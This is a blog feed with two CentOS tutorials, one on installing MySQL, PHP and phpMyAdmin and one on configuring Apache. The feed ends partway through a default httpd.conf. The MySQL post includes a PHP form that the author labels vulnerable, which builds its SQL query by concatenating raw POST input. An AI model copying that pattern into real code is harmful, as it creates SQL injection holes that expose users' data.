<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: linux | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/linux/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-03-30T09:12:19-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Setting up MySQL and PHP on Apache]]></title>
    <link href="http://chousensha.github.io/blog/2017/02/25/setting-up-mysql-and-php-on-apache/"/>
    <updated>2017-02-25T03:58:37-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/02/25/setting-up-mysql-and-php-on-apache</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since my last post, but a full time job + the Cisco Cybersecurity scholarship are really eating into my time. But I will try to sneak a post here and there, whenever I can!</p>

<p>In a <a href="http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache/">previous post</a>, I made a tutorial about setting up Apache on CentOS. The next step is to fire a MySQL server and put some databases on that web server!</p>

<!-- more -->


<h2>Installing MySQL server</h2>

<p>First, we need to visit the <a href="https://dev.mysql.com/downloads/repo/yum/">MySQL community repository</a> to download the server package:</p>

<p>``` plain
wget <a href="https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm">https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm</a>
&mdash;2017-01-19 10:06:02&mdash;  <a href="https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm">https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm</a>
Resolving repo.mysql.com (repo.mysql.com)&hellip; 104.87.9.47
Connecting to repo.mysql.com (repo.mysql.com)|104.87.9.47|:443&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 9224 (9.0K) [application/x-redhat-package-manager]
Saving to: ‘mysql57-community-release-el7-9.noarch.rpm’</p>

<p>100%[===========================================================================================================>] 9,224       &mdash;.-K/s   in 0s</p>

<p>2017-01-19 10:06:02 (137 MB/s) &ndash; ‘mysql57-community-release-el7-9.noarch.rpm’ saved [9224/9224]
```</p>

<p>Next we install the package:</p>

<p><code>plain
rpm -ivh mysql57-community-release-el7-9.noarch.rpm
warning: mysql57-community-release-el7-9.noarch.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEY
Preparing...                          ################################# [100%]
Updating / installing...
   1:mysql57-community-release-el7-9  ################################# [100%]
</code></p>

<p>After running <code>yum update</code> and waiting for a while, you can install MySQL server from the newly added repository with <code>yum install mysql-server</code>.</p>

<p>After the installation, a new user has been created in <code>/etc/passwd</code>, and a group in <code>/etc/group</code>:</p>

<p>``` plain
cat /etc/passwd | grep mysql
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false</p>

<p>cat /etc/group | grep mysql
mysql:x:27:
```</p>

<h2>Configuration</h2>

<p>Next, start the service with <code>systemctl start mysqld</code>. The next step is to run the <code>mysql_secure_installation</code> binary to make some security configurations to your server, but for that you need the temporary root password that was generated during installation:</p>

<p><code>plain
grep 'password' /var/log/mysqld.log
2017-01-19T08:53:45.638708Z 1 [Note] A temporary password is generated for root@localhost: hoPAejdrk6_a
</code></p>

<p>After running <code>mysql_secure_installation</code>, you will be asked to change the root password in accordance with a policy that requires 12 characters, with a mix of uppercase, lowercase, numbers and special characters. Then you will be prompted to answer some questions regarding the removal of anonymous users, test databases, and disallowing remote root login.</p>

<p>To access your MySQL instance via the command line, log in as root and give your password:</p>

<p>``` plain
mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.7.17 MySQL Community Server (GPL)</p>

<p>Copyright &copy; 2000, 2016, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql>
```</p>

<p>Let&rsquo;s look at what databases are available:</p>

<p><code>plain
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.00 sec)
</code></p>

<p>I created a new database to play with:</p>

<p><code>plain
mysql&gt; create database vip;
Query OK, 1 row affected (0.00 sec)
</code></p>

<p>Now change the current DB to point the one you created:</p>

<p><code>plain
mysql&gt; use vip;
Database changed
</code></p>

<h3>Backup and restoration</h3>

<p>Before throwing some data into it, let&rsquo;s first see how to back up data and restore it. For this, we have the <strong>mysqldump</strong> utility. To make a backup of my newly created DB, I typed: <code>mysqldump -u root -p vip > backup.sql</code>.</p>

<p>Then I deleted the DB with the <code>drop database vip;</code> command. For some reason though, I could not restore the DB without first creating a DB with the same name. The restore command is <code>mysql -u root -p vip &lt; backup.sql</code>.</p>

<h3>Adding data to DB</h3>

<p>The database is all well and good, but we need to put a table in there!</p>

<p><code>sql
create table users (
name VARCHAR(10)
);
</code></p>

<p>I made a <em>users</em> table with one column for the <em>name</em>. Let&rsquo;s confirm this:</p>

<p><code>plain
mysql&gt; show tables;
+---------------+
| Tables_in_vip |
+---------------+
| users         |
+---------------+
1 row in set (0.00 sec)
</code></p>

<p>Next, I made some users:</p>

<p>``` plain
mysql> insert into users values (&lsquo;root&rsquo;);
Query OK, 1 row affected (0.04 sec)</p>

<p>mysql> insert into users values (&lsquo;guest&rsquo;);
Query OK, 1 row affected (0.00 sec)</p>

<p>mysql> select * from users;
+&mdash;&mdash;&mdash;&ndash;+
| name  |
+&mdash;&mdash;&mdash;&ndash;+
| root  |
| guest |
+&mdash;&mdash;&mdash;&ndash;+
2 rows in set (0.00 sec)
```</p>

<p>Let&rsquo;s see the DB in action by integrating it with some PHP!</p>

<h2>Installing PHP</h2>

<p>Installing PHP on CentOS can be done with the following command: <code>yum install php php-mysql</code></p>

<p>The next step is to write some PHP code to connect to the DB. But this is not Debian, so nothing just works! There is the pesky SELinux to take into account, and it&rsquo;s not letting Apache to reach the MySQL DB. Use <strong>getsebool</strong> to see the boolean values for the web server:</p>

<p><code>plain
getsebool -a | grep httpd
httpd_anon_write --&gt; off
httpd_builtin_scripting --&gt; on
httpd_can_check_spam --&gt; off
httpd_can_connect_ftp --&gt; off
httpd_can_connect_ldap --&gt; off
httpd_can_connect_mythtv --&gt; off
httpd_can_connect_zabbix --&gt; off
httpd_can_network_connect --&gt; off
httpd_can_network_connect_cobbler --&gt; off
httpd_can_network_connect_db --&gt; off
httpd_can_network_memcache --&gt; off
httpd_can_network_relay --&gt; off
httpd_can_sendmail --&gt; off
httpd_dbus_avahi --&gt; off
httpd_dbus_sssd --&gt; off
httpd_dontaudit_search_dirs --&gt; off
httpd_enable_cgi --&gt; on
httpd_enable_ftp_server --&gt; off
httpd_enable_homedirs --&gt; off
httpd_execmem --&gt; off
httpd_graceful_shutdown --&gt; on
httpd_manage_ipa --&gt; off
httpd_mod_auth_ntlm_winbind --&gt; off
httpd_mod_auth_pam --&gt; off
httpd_read_user_content --&gt; off
httpd_run_ipa --&gt; off
httpd_run_preupgrade --&gt; off
httpd_run_stickshift --&gt; off
httpd_serve_cobbler_files --&gt; off
httpd_setrlimit --&gt; off
httpd_ssi_exec --&gt; off
httpd_sys_script_anon_write --&gt; off
httpd_tmp_exec --&gt; off
httpd_tty_comm --&gt; off
httpd_unified --&gt; off
httpd_use_cifs --&gt; off
httpd_use_fusefs --&gt; off
httpd_use_gpg --&gt; off
httpd_use_nfs --&gt; off
httpd_use_openstack --&gt; off
httpd_use_sasl --&gt; off
httpd_verify_dns --&gt; off
</code></p>

<p>As you can see, by default Apache is very limited in what it can do. Let&rsquo;s change that and allow it to connect to the DB server, and make the change persist across reboots:</p>

<p><code>plain
setsebool -P httpd_can_network_connect_db 1
</code></p>

<p>If you check again, you will see that the <code>httpd_can_network_connect_db</code> boolean is now set to on. I&rsquo;ve used the code from the <a href="http://php.net/manual/en/function.mysqli-connect.php">PHP mysqli_connect() documentation</a> to check the connection status, and finally, it went from failure to success.</p>

<p>``` php</p>

<p>&lt;?php
$link = mysqli_connect(&ldquo;127.0.0.1&rdquo;, &ldquo;my_user&rdquo;, &ldquo;my_password&rdquo;, &ldquo;my_db&rdquo;);</p>

<p>if (!$link) {</p>

<pre><code>echo "Error: Unable to connect to MySQL." . PHP_EOL;
echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;
exit;
</code></pre>

<p>}</p>

<p>echo &ldquo;Success: A proper connection to MySQL was made! The my_db database is great.&rdquo; . PHP_EOL;
echo &ldquo;Host information: &rdquo; . mysqli_get_host_info($link) . PHP_EOL;</p>

<p>mysqli_close($link);
?>
```</p>

<p>Next, I made a really basic, vulnerable page just to see if things are working. I placed the following PHP file in my web server directory:</p>

<p>``` php</p>

<p><html></p>

<p><form action="reallyproform.php" method="post">
   <p>Enter a name in this box to see if you know anyone in the VIP area: <input type="text" name="username" /></p>
   <input type="submit" name="submit" value="Submit" />
</form></p>

<p></body></p>

<p></html></p>

<p>&lt;?php
$link = mysqli_connect(&ldquo;127.0.0.1&rdquo;, &ldquo;username&rdquo;, &ldquo;password&rdquo;, &ldquo;database name&rdquo;);</p>

<p>$username = $_POST[&lsquo;username&rsquo;];</p>

<p>$query = &ldquo;SELECT * FROM users WHERE name = &lsquo;&rdquo;.$username.&ldquo;&rsquo;&rdquo;;
$result = mysqli_query($link,$query);</p>

<p>if(mysqli_num_rows($result)>=1)</p>

<pre><code>       {
        echo"Yes you are. Proceed";
       }
</code></pre>

<p>else
{
echo &ldquo;Are you sure you&rsquo;re supposed to be here?&rdquo;;
}</p>

<p>mysqli_close($link);
?></p>

<p>```</p>

<p><img class="center" src="/images/sysadmin/page.png" title="&lsquo;Sample PHP page&rsquo; &lsquo;PHP form&rsquo;" ></p>

<p>If you enter a valid username, you will just get a message, but this was just an example to show a working connection between the PHP code hosted on the server and the MySQL database.</p>

<h3>phpMyAdmin setup</h3>

<p>Chances are, you won&rsquo;t feel an urge to always interact with your DB via the command line. The last step in this post is to install and configure phpMyAdmin in order to do all the SQL operations from a web interface.</p>

<p>First, install it with the following command:</p>

<p><code>plain
yum install phpmyadmin
</code></p>

<p>Restart Apache and go to <a href="http://127.0.0.1/phpmyadmin">http://127.0.0.1/phpmyadmin</a> to see your new phpMyAdmin interface.</p>

<p>``` plain
/ You plan things that you do not even \
| attempt because of your extreme      |
\ caution.                             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting started with Apache]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache/"/>
    <updated>2016-08-05T07:26:16-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache</id>
    <content type="html"><![CDATA[<p>In this post I will go over the installation and configuration of an Apache web server on CentOS.</p>

<!-- more -->


<h1>Installation</h1>

<p>First, let&rsquo;s verify whether Apache is already installed. Note that on CentOS, the package (and process name) for Apache is called <strong>httpd</strong>.</p>

<p><code>plain
rpm -q httpd
package httpd is not installed
ls -l /var/www
ls: cannot access /var/www: No such file or directory
</code></p>

<p>Apache is not installed, so let&rsquo;s install it with <code>yum install httpd</code>. Now verify that it has been installed:</p>

<p><code>plain
rpm -q httpd
httpd-2.4.6-40.el7.centos.4.x86_64
ls -l /var/www
total 0
drwxr-xr-x. 2 root root 6 Jul 18 18:30 cgi-bin
drwxr-xr-x. 2 root root 6 Jul 18 18:30 html
</code></p>

<p>Remember that the directory for Apache configuration is <code>/etc/httpd</code>:</p>

<p><code>plain
[root@localhost ~]# ls /etc/httpd
conf  conf.d  conf.modules.d  logs  modules  run
</code></p>

<p>And the Apache configuration file is <code>/etc/httpd/conf/httpd.conf</code>. I included a snapshot of a fresh config file at the end of this post.</p>

<h1>Configuration</h1>

<p>Now we can start Apache and check that it is running with the <strong>apachectl</strong> command, that provides a front-end control interface for the httpd daemon. For reference, the man page for this utility is at the end of the post.</p>

<p>To start the web server, type <code>apachectl start</code> (alternatively, you can do it with <code>service httpd start</code>, and can use the httpd daemon directly to pass arguments, etc. At the end I&rsquo;ve also included the httpd man page.</p>

<p>If you&rsquo;re getting a message like &ldquo;Could not reliably determine the server&rsquo;s fully qualified domain name&rdquo;, you can modify the ServerName in the configuration file and then restart the server. After making changes to the config file, it&rsquo;s also a good idea to check if there are any errors in it:</p>

<p><code>plain
[root@freehat ~]# apachectl configtest
Syntax OK
</code></p>

<p>Now, let&rsquo;s check the status of the server:</p>

<p>``` plain
[root@localhost ~]# apachectl status
* httpd.service &ndash; The Apache HTTP Server
   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)
   Active: active (running) since Tue 2016-08-02 15:53:53 EEST; 1min 42s ago</p>

<pre><code> Docs: man:httpd(8)
       man:apachectl(8)
</code></pre>

<p> Main PID: 5941 (httpd)
   Status: &ldquo;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&rdquo;
[snip]
```</p>

<p>Also, if you want Apache to start on boot, you need to specify it:</p>

<p><code>plain
chkconfig httpd on
Note: Forwarding request to 'systemctl enable httpd.service'.
Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.
</code></p>

<p>If you need to troubleshoot your Apache, you can consult the error log at <code>/var/log/httpd/error_log</code>.</p>

<h2>Site setup</h2>

<p>To add an index for your site, create an <em>index.html</em> file inside <code>/var/www/html/</code>. This is what you&rsquo;ll see when visiting your site.</p>

<p><code>plain
[root@localhost ~]# echo 'Hello interwebz!' &gt; /var/www/html/index.html
</code></p>

<p>When you navigate to your website, this page will be what you&rsquo;ll see. On other distributions, a default index.html may be present in the website root (identified by the DocumentRoot directive).</p>

<h3>Virtual hosts</h3>

<p>Virtual hosts allow you to run multiple websites on a single server. Let&rsquo;s see some examples of how we can do that.</p>

<h4>Port-based vhosts</h4>

<p>One option is to <strong>put each website on a different port</strong>. In addition to our main website on port 80, let&rsquo;s serve a different one on port 8080.</p>

<p>First, add a new Listen directive in <code>/etc/httpd/conf/httpd.conf</code>, to tell Apache to also listen on port 8080:</p>

<p><code>plain
Listen 80
Listen 8080
</code></p>

<p>We could add virtual hosts in the main configuration file, but if you plan to serve many websites, better to create separate configuration files for each virtual host. Check that the line telling Apache to load other config files is uncommented:</p>

<p>``` plain</p>

<h1>Load config files in the &ldquo;/etc/httpd/conf.d&rdquo; directory, if any.</h1>

<p>IncludeOptional conf.d/*.conf
```</p>

<p>Now, create a config file for a specific virtual host (it must end in .conf):</p>

<p>``` plain
[root@freehat ~]# nano /etc/httpd/conf.d/skynet.conf
[root@freehat ~]# cat /etc/httpd/conf.d/skynet.conf
<VirtualHost *:8080></p>

<pre><code>DocumentRoot "/var/www/html/skynet"
ServerName skynet.local
</code></pre>

<p></VirtualHost>
```</p>

<p>Next, create the necessary document root directory:</p>

<p><code>plain
[root@freehat ~]# mkdir /var/www/html/skynet
</code></p>

<p>Put some resource that you want to be server in the folder:</p>

<p><code>plain
[root@freehat ~]# echo 'You are marked for extermination' &gt;  /var/www/html/skynet/index.html
</code></p>

<p>The last step is to tell Apache to reload its configuration files with <code>service httpd reload</code>. However, now I ran into some SELinux alert. I looked in <code>/var/log/messages</code>:</p>

<p><code>plain
Aug  3 16:16:16 localhost setroubleshoot: SELinux is preventing /usr/sbin/httpd from name_connect access on the tcp_socket port 8080. For complete SELinux messages. run sealert -l bc571bd3-344f-4a4e-830a-ce744154d527
</code></p>

<p>I ran the mentioned command but was confused by my first brush with SELinux, so I did some google-fu which led me to <a href="https://www.certdepot.net/rhel7-use-selinux-port-labelling/">this post</a>. You can verify what ports are allowed by SELinux for HTTP traffic with the below command:</p>

<p><code>plain
[root@freehat ~]# semanage port -l | grep http
http_cache_port_t              tcp      8080, 8118, 8123, 10001-10010
http_cache_port_t              udp      3130
http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000
pegasus_http_port_t            tcp      5988
pegasus_https_port_t           tcp      5989
</code></p>

<p>To add port 8080 to http_port_t, I ran <code>semanage port -m -t http_port_t -p tcp 8080</code>, and then I checked it was added. Should be all good now. If you go visit your server on port 8080, you should get a friendly message. To differentiate it from the website on port 80, create another virtual host configuration for that respective server.</p>

<p>You can now access your sites from your own machine, but if you try navigating to them from another computer, it will be just like the websites don&rsquo;t exist! It turns out, iptables is blocking access, and you have to tell it to open the ports:</p>

<p><code>plain
[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 80 -j ACCEPT
[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 8080 -j ACCEPT
</code></p>

<p>And if you want these changes to survive a reboot, you should save them. I had to do some additional work for that. It turns out, <a href="https://stackoverflow.com/questions/24756240/how-can-i-use-iptables-on-centos-7">RHEL 7 and CentOS 7 use <em>firewalld</em></a> to manage iptables. So first I followed the instructions on StackOverflow to stop and mask the firewalld service:</p>

<p><code>plain
systemctl stop firewalld
[root@freehat ~]# systemctl mask firewalld
Created symlink from /etc/systemd/system/firewalld.service to /dev/null.
</code></p>

<p>Then I had to install <em>iptables-services</em>: <code>yum install iptables-services</code>. Next I enabled it at boot:</p>

<p><code>plain
systemctl enable iptables
Created symlink from /etc/systemd/system/basic.target.wants/iptables.service to /usr/lib/systemd/system/iptables.service.
</code></p>

<p>I also modified the &ldquo;no&rdquo; defaults in <code>/etc/sysconfig/iptables-config</code> to &ldquo;yes&rdquo;:</p>

<p>``` plain</p>

<h1>Save current firewall rules on stop.</h1>

<h1>Value: yes|no,  default: no</h1>

<h1>Saves all firewall rules to /etc/sysconfig/iptables if firewall gets stopped</h1>

<h1>(e.g. on system shutdown).</h1>

<p>IPTABLES_SAVE_ON_STOP=&ldquo;yes&rdquo;</p>

<h1>Save current firewall rules on restart.</h1>

<h1>Value: yes|no,  default: no</h1>

<h1>Saves all firewall rules to /etc/sysconfig/iptables if firewall gets</h1>

<h1>restarted.</h1>

<p>IPTABLES_SAVE_ON_RESTART=&ldquo;yes&rdquo;
```</p>

<p>Finally, I was able to save the changes and checked that they persisted after reboot:</p>

<p><code>plain
service iptables save
iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]
</code></p>

<h4>Name-based vhosts</h4>

<p>We&rsquo;ve seen the virtual hosts running on different ports, now let&rsquo;s see how we can <strong>serve them on the same port, but with different names</strong>. I modified one of the config files so that both sites will run on port 80.Let&rsquo;s see the current virtual host settings:</p>

<p>``` plain
httpd -S
VirtualHost configuration:
*:80                   is a NameVirtualHost</p>

<pre><code>     default server myweb.local (/etc/httpd/conf.d/myweb.conf:1)
     port 80 namevhost myweb.local (/etc/httpd/conf.d/myweb.conf:1)
     port 80 namevhost skynet.local (/etc/httpd/conf.d/skynet.conf:1)
</code></pre>

<p>ServerRoot: &ldquo;/etc/httpd&rdquo;
Main DocumentRoot: &ldquo;/var/www/html&rdquo;
Main ErrorLog: &ldquo;/etc/httpd/logs/error_log&rdquo;
[snip]
```</p>

<p>We will use the server names to navigate to those sites. Because I am testing locally with no DNS, I modified <code>/etc/hosts</code> and added these entries:</p>

<p><code>plain
192.168.80.153 myweb.local
192.168.80.153 skynet.local
</code></p>

<p>Now I was able to use the names of the sites in the web browser.</p>

<h3>Password protection</h3>

<p>It&rsquo;s time to restrict access to the skynet website! There are a number of ways that Apache can protect a resource with a password and ensure that is accessible only to certain users. In this example, I will want the skynet website to allow only a user called tx. First, I used the <em>htpasswd</em> utility to create a <em>.htpasswd</em> file (you can call it whatever you want), and placed it in <code>/etc/httpd</code>.</p>

<p><code>plain
htpasswd -c /etc/httpd/.htpasswd tx
New password:
Re-type new password:
Adding password for user tx
</code></p>

<p>This file holds the allowed user/password combination:</p>

<p><code>plain
cat /etc/httpd/.htpasswd
tx:$apr1$2FI77JZQ$IrMFnxvHzvtRhWGiQfvxL0
</code></p>

<p>The next step is to tell Apache to restrict access to a resource based on this file. If you have access to the main configuration file or the virtual host config file, the preferred way is to add a Directory directive there:</p>

<p>``` plain
nano /etc/httpd/conf.d/skynet.conf
<VirtualHost *:80></p>

<pre><code>DocumentRoot "/var/www/html/skynet"
ServerName skynet.local
&lt;Directory "/var/www/html/skynet"&gt;
    AuthType Basic
    AuthName "Authorized Only"
    AuthUserFile /etc/httpd/.htpasswd
    Require valid-user
&lt;/Directory&gt;
</code></pre>

<p></VirtualHost></p>

<p>```</p>

<p>The Directory specified is the one that will be password-protected. Next, we specify the type of authentication (basic in this case, so no super sensitive files should be stored there), the name which will be displayed on the prompt, the location where Apache can find the password file, and the allowed user(s). Maybe we&rsquo;ll want to add some terminators later, so instead of just specifying one user, I allowed any valid user/password combination from the password file.</p>

<p>Now if you try to go to the skynet website, you will see the window prompting for username and password.</p>

<p>Another way you can restrict directory access is via a <strong>.htaccess</strong> file. Due to performance and security reasons, you should avoid this, if possible.</p>

<p>First, create a .htaccess file in the directory you want to protect:</p>

<p><code>plain
nano /var/www/html/skynet/.htaccess
AuthType Basic
AuthName "Authorized Only"
AuthUserFile /etc/httpd/.htpasswd
Require valid-user
</code></p>

<p>For the .htaccess file to work, you need to edit the <code>/etc/httpd/conf/httpd.conf</code> file, and change the <a href="https://httpd.apache.org/docs/current/mod/core.html#allowoverride">AllowOverride directive</a> inside Directory. When set to None, as it is by default, .htaccess files are ignored. Change it to AuthConfig (I had to do it both under /var/www and /var/www/html).</p>

<h3>HTTPS with self-signed certificate</h3>

<p>In the next demo, I will encrypt the skynet website with SSL (removed all the authorization bits for demo purposes).</p>

<p>First, I installed <a href="https://httpd.apache.org/docs/current/mod/mod_ssl.html">mod_ssl</a> with <code>yum install mod_ssl</code>. Next, I created a directory for Apache to store its server key and certificate: <code>mkdir /etc/httpd/myssl</code></p>

<p>Inside this directory, I created a RSA private key of length 2048:</p>

<p><code>plain
[root@freehat myssl]# openssl genrsa -out https.key 2048
Generating RSA private key, 2048 bit long modulus
....................+++
..............+++
e is 65537 (0x10001)
</code></p>

<p>Then I created a Certificate Signing Request (CSR):</p>

<p>``` plain
[root@freehat myssl]# openssl req -new -key https.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,</p>

<h2>If you enter &lsquo;.&rsquo;, the field will be left blank.</h2>

<p>Country Name (2 letter code) [XX]:
State or Province Name (full name) []:
Locality Name (eg, city) [Default City]:
Organization Name (eg, company) [Default Company Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (eg, your name or your server&rsquo;s hostname) []:
Email Address []:</p>

<p>Please enter the following &lsquo;extra&rsquo; attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```</p>

<p>Lastly, I generated an x509 certificate with a duration of an year:</p>

<p><code>plain
[root@freehat myssl]# openssl x509 -req -days 365 -in server.csr -signkey https.key -out mycert.crt
Signature ok
subject=/C=XX/L=Default City/O=Default Company Ltd
Getting Private key
</code></p>

<p>We&rsquo;re not done yet. Edit the file <code>/etc/httpd/conf.d/ssl.conf</code>, and comment the lines with the location of the server key and certificate, replacing them with new ones pointing at our previously created files:</p>

<p>``` plain</p>

<h1>SSLCertificateFile /etc/pki/tls/certs/localhost.crt</h1>

<p>SSLCertificateFile /etc/httpd/myssl/mycert.crt</p>

<h1>SSLCertificateKeyFile /etc/pki/tls/private/localhost.key</h1>

<p>SSLCertificateKeyFile /etc/httpd/myssl/https.key
```</p>

<p>Now restart the server and go to website (mine is at <a href="https://192.168.80.153/">https://192.168.80.153/</a> ). Your browser will warn you about the untrusted connection, add it to exceptions and now you have https on your site.</p>

<h3>Logging</h3>

<p>Lastly, let&rsquo;s go over Apache&rsquo;s logging system. There are 2 types of logs kept, error logs for when some error happens, and access logs, that provide information about incoming requests. By default, these logs are located at <code>/var/log/httpd/error_log</code> and <code>/var/log/httpd/access_log</code> on CentOS</p>

<p>For your sites, you can configure the logs and choose where to store them. I decided to separate the logs for my skynet website. I made a folder for them in /var/log/httpd/skynet-logs, and modified the skynet virtual host config file and added the path and format for the logs:</p>

<p><code>plain
CustomLog /var/log/httpd/skynet-logs/skynet-access.log combined
ErrorLog /var/log/httpd/skynet-logs/skynet-error.log
</code></p>

<p>I wanted the combined format instead of the common one, because it provides a bit more information, including also the User-agent and the Referer</p>

<p>Hopefully, this post has helped others in setting up an Apache web server. Since I&rsquo;ve installed it on CentOS 7, I also had to account for SELinux and some other differences from a Debian distro, so it&rsquo;s been a good learning experience.</p>

<p>If you want to become an Apache wizard, the <a href="https://httpd.apache.org/docs/2.4/">Apache 2.4 documentation</a> should be a good starting point.</p>

<p>``` plain</p>

<hr />

<p>/ Give thought to your reputation.       \
| Consider changing name and moving to a |
\ new town.                              /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>

<p><strong>Freshly installed httpd.conf file</strong></p>

<p>``` plain
#</p>

<h1>This is the main Apache HTTP server configuration file.  It contains the</h1>

<h1>configuration directives that give the server its instructions.</h1>

<h1>See &lt;URL:<a href="http://httpd.apache.org/docs/2.4/">http://httpd.apache.org/docs/2.4/</a>> for detailed information.</h1>

<h1>In particular, see</h1>

<h1>&lt;URL:<a href="http://httpd.apache.org/docs/2.4/mod/directives.html">http://httpd.apache.org/docs/2.4/mod/directives.html</a>></h1>

<h1>for a discussion of each configuration directive.</h1>

<p>#</p>

<h1>Do NOT simply read the instructions in here without understanding</h1>

<h1>what they do.  They&rsquo;re here only as hints or reminders.  If you are unsure</h1>

<h1>consult the online docs. You have been warned.</h1>

<p>#</p>

<h1>Configuration and logfile names: If the filenames you specify for many</h1>

<h1>of the server&rsquo;s control files begin with &ldquo;/&rdquo; (or &ldquo;drive:/&rdquo; for Win32), the</h1>

<h1>server will use that explicit path.  If the filenames do <em>not</em> begin</h1>

<h1>with &ldquo;/&rdquo;, the value of ServerRoot is prepended &mdash; so &lsquo;log/access_log&rsquo;</h1>

<h1>with ServerRoot set to &lsquo;/www&rsquo; will be interpreted by the</h1>

<h1>server as &lsquo;/www/log/access_log&rsquo;, where as &lsquo;/log/access_log&rsquo; will be</h1>

<h1>interpreted as &lsquo;/log/access_log&rsquo;.</h1>

<p>#</p>

<h1>ServerRoot: The top of the directory tree under which the server&rsquo;s</h1>

<h1>configuration, error, and log files are kept.</h1>

<p>#</p>

<h1>Do not add a slash at the end of the directory path.  If you point</h1>

<h1>ServerRoot at a non-local disk, be sure to specify a local disk on the</h1>

<h1>Mutex directive, if file-based mutexes are used.  If you wish to share the</h1>

<h1>same ServerRoot for multiple httpd daemons, you will need to change at</h1>

<h1>least PidFile.</h1>

<p>#
ServerRoot &ldquo;/etc/httpd&rdquo;</p>

<p>#</p>

<h1>Listen: Allows you to bind Apache to specific IP addresses and/or</h1>

<h1>ports, instead of the default. See also the <VirtualHost></h1>

<h1>directive.</h1>

<p>#</p>

<h1>Change this to Listen on specific IP addresses as shown below to</h1>

<h1>prevent Apache from glomming onto all bound IP addresses.</h1>

<p>#</p>

<h1>Listen 12.34.56.78:80</h1>

<p>Listen 80</p>

<p>#</p>

<h1>Dynamic Shared Object (DSO) Support</h1>

<p>#</p>

<h1>To be able to use the functionality of a module which was built as a DSO you</h1>

<h1>have to place corresponding `LoadModule' lines at this location so the</h1>

<h1>directives contained in it are actually available <em>before</em> they are used.</h1>

<h1>Statically compiled modules (those listed by `httpd -l') do not need</h1>

<h1>to be loaded here.</h1>

<p>#</p>

<h1>Example:</h1>

<h1>LoadModule foo_module modules/mod_foo.so</h1>

<p>#
Include conf.modules.d/*.conf</p>

<p>#</p>

<h1>If you wish httpd to run as a different user or group, you must run</h1>

<h1>httpd as root initially and it will switch.</h1>

<p>#</p>

<h1>User/Group: The name (or #number) of the user/group to run httpd as.</h1>

<h1>It is usually good practice to create a dedicated user and group for</h1>

<h1>running httpd, as with most system services.</h1>

<p>#
User apache
Group apache</p>

<h1>&lsquo;Main&rsquo; server configuration</h1>

<p>#</p>

<h1>The directives in this section set up the values used by the &lsquo;main&rsquo;</h1>

<h1>server, which responds to any requests that aren&rsquo;t handled by a</h1>

<h1><VirtualHost> definition.  These values also provide defaults for</h1>

<h1>any <VirtualHost> containers you may define later in the file.</h1>

<p>#</p>

<h1>All of these directives may appear inside <VirtualHost> containers,</h1>

<h1>in which case these default settings will be overridden for the</h1>

<h1>virtual host being defined.</h1>

<p>#</p>

<p>#</p>

<h1>ServerAdmin: Your address, where problems with the server should be</h1>

<h1>e-mailed.  This address appears on some server-generated pages, such</h1>

<h1>as error documents.  e.g. <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#121;&#x6f;&#117;&#x72;&#x2d;&#100;&#x6f;&#109;&#97;&#x69;&#x6e;&#x2e;&#99;&#111;&#x6d;">&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#121;&#x6f;&#117;&#114;&#x2d;&#100;&#111;&#109;&#x61;&#105;&#x6e;&#46;&#x63;&#111;&#109;</a></h1>

<p>#
ServerAdmin root@localhost</p>

<p>#</p>

<h1>ServerName gives the name and port that the server uses to identify itself.</h1>

<h1>This can often be determined automatically, but we recommend you specify</h1>

<h1>it explicitly to prevent problems during startup.</h1>

<p>#</p>

<h1>If your host doesn&rsquo;t have a registered DNS name, enter its IP address here.</h1>

<p>#</p>

<h1>ServerName www.example.com:80</h1>

<p>#</p>

